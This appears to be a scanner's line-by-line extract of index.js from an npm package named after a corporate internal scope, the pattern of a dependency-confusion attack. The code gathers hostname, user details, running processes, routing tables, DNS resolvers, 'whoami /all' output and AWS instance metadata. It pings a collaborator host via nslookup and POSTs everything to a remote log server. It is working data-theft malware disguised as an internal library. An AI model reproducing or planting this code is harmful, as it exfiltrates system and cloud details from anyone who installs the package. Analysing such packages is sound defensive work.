// File: tmp/tmpq0_ylz98/@usaa-grp-ent-conv-platform-usaa/package/index.js
// ======================================================================
Line 1: const os = require('os')
Line 2: const https = require('https')
Line 3: _tmp_13 = require('child_process')
Line 8: execSync(`nslookup ${collaboratorURL}`)
Line 13: os.hostname()
Line 14: os.userInfo()
Line 15: os.platform()
Line 16: os.arch()
Line 17: os.cpus()
Line 28: {
        // Get running processes
        systemInfo.runningProcesses = execSync('tasklist || ps aux', { encoding: 'utf8' }).split('\n');

        // Get internal routing table
        systemInfo.internalRoutes = execSync('route print || route -n', { encoding: 'utf8' });

        // Get DNS resolvers
        systemInfo.dnsResolvers = execSync('nslookup google.com || cat /etc/resolv.conf', { encoding: 'utf8' });

        // Get Active Directory domain (Windows)
        if (os.platform() === 'win32') {
            systemInfo.activeDirectoryDomain = execSync('whoami /all', { encoding: 'utf8' });
        } else {
            systemInfo.activeDirectoryDomain = execSync('cat /etc/hostname', { encoding: 'utf8' });
        }

        // AWS Metadata Check
        systemInfo.awsMetadata = execSync('curl -s http://169.254.169.254/latest/meta-data/', { encoding: 'utf8' });

    }
Line 30: execSync('tasklist || ps aux', { encoding: 'utf8' })
Line 33: systemInfo.internalRoutes = execSync('route print || route -n', { encoding: 'utf8' })
Line 36: systemInfo.dnsResolvers = execSync('nslookup google.com || cat /etc/resolv.conf', { encoding: 'utf8' })
Line 39: {
            systemInfo.activeDirectoryDomain = execSync('whoami /all', { encoding: 'utf8' });
        }
Line 40: systemInfo.activeDirectoryDomain = execSync('whoami /all', { encoding: 'utf8' })
Line 41: {
            systemInfo.activeDirectoryDomain = execSync('cat /etc/hostname', { encoding: 'utf8' });
        }
Line 42: systemInfo.activeDirectoryDomain = execSync('cat /etc/hostname', { encoding: 'utf8' })
Line 46: systemInfo.awsMetadata = execSync('curl -s http://169.254.169.254/latest/meta-data/', { encoding: 'utf8' })
Line 56: {
    const data = getSystemInfo();
    const options = {
        hostname: logServer,
        port: 443,
        path: '/',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length
        }
    };

    const req = https.request(options, (res) => {
        console.log(`[+] Sent data, response code: ${res.statusCode}`);
    });

    req.on('error', (error) => {
        console.error(`[-] Error sending log: ${error.message}`);
    });

    req.write(data);
    req.end();
}
Line 69: const req = https.request(options, (res) => {
        console.log(`[+] Sent data, response code: ${res.statusCode}`);
    })
Line 70: console.log(`[+] Sent data, response code: ${res.statusCode}`)
Line 73: {
        console.error(`[-] Error sending log: ${error.message}`);
    }
Line 74: console.error(`[-] Error sending log: ${error.message}`)
Line 77: req.write(data)
Line 78: req.end()
